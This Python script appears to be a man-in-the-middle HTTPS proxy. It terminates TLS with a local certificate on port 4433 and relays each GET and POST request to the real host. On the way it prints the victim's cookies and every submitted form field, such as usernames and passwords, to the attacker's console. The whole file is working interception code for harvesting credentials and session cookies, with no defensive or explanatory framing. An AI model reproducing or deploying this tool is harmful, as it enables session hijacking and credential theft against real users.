import http.client
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import socketserver
from cgi import parse_header, parse_multipart
from urllib.parse import parse_qs
import http.client, urllib.parse


stop = 1


class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        print('[*] GET', self.headers['Host'] + "/" + self.path)

        try:
            hs = {}
            for h in self.headers:
                if str(h) != 'Accept-Encoding':
                    hs[h] = self.headers[h]
            print("\t\tcookie: ", self.headers['Cookie'])
            print("\n")
            conn = http.client.HTTPSConnection(self.headers['Host'])
            conn.request("GET", self.path, headers=hs) # TODO check if headers are working
            r1 = conn.getresponse()
            #print(r1.status, r1.reason)
            data1 = r1.read()

            self.wfile.write(b'HTTP/1.1 200 OK')
            for h in r1.headers:
                self.send_header(h, r1.headers[h])
            self.end_headers()
            self.wfile.write(data1)
        except Exception as e:
            print(e)

    def parse_POST(self):
        ctype, pdict = parse_header(self.headers['content-type'])
        if ctype == 'multipart/form-data':
            postvars = parse_multipart(self.rfile, pdict)
        elif ctype == 'application/x-www-form-urlencoded':
            length = int(self.headers['content-length'])
            postvars = parse_qs(
                self.rfile.read(length),
                keep_blank_values=1)
        else:
            postvars = {}
        return postvars

    def do_POST(self):
        print("[*] POST " + self.headers['Host'] + " " + self.path)
        tmp = self.parse_POST()
        postvars = {}

        print("\t\tcookie: ", self.headers['Cookie'])
        for v in tmp:
            postvars[v.decode('ascii')] = tmp[v][0].decode('ascii')
        params = urllib.parse.urlencode(postvars)

        print("\t\tPOST variables:")
        for v in postvars:
            print("\t\t\t", v, ": ", postvars[v])
        print("\n")
        hs = {}
        for h in self.headers:
            hs[h] = self.headers[h]
        conn = http.client.HTTPSConnection(self.headers['Host'])
        conn.request("POST", self.path, params, hs)  # TODO check if headers are working
        r1 = conn.getresponse()
        #print(r1.status, r1.reason)
        data1 = r1.read()  # This will return entire content.
        self.wfile.write(b'HTTP/1.1 200 OK')
        for h in r1.headers:
            self.send_header(h, r1.headers[h])
        self.end_headers()
        self.wfile.write(data1)


class ForkingHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    def finish_request(self, request, client_address):
        request.settimeout(30)
        # "super" can not be used because BaseServer is not created from object
        HTTPServer.finish_request(self, request, client_address)


def start_server(host_ip):
    global stop
    while stop:
        try:
            print("[*] MITM proxy running...")
            httpd = ForkingHTTPServer((host_ip, 4433), MyHandler)
            httpd.socket = ssl.wrap_socket(httpd.socket, certfile='cert.pem', keyfile='key.pem', server_side=True,
                                           cert_reqs=ssl.CERT_OPTIONAL, ssl_version=ssl.PROTOCOL_TLSv1)
            httpd.serve_forever()  # serve_forever
        except Exception as e:
            print(str(e))
        finally:
            httpd.socket.close()
            print("[*] MITM proxy stopped")